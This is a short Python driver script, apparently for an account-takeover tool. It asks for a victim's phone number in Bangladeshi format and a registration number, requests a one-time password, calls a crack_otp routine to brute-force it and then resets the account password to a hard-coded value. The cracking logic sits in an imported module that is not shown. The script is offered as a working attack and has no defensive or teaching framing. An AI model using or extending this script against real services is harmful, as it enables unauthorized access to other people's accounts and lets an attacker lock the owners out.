from assist import ChangePassword

p = input("PhoneNumber(example:88017********):")
r= input("RegistrationNumber:")
target = ChangePassword(p,r)

target.req_otp()
target.crack_otp()
target.changePass("Doha123456")
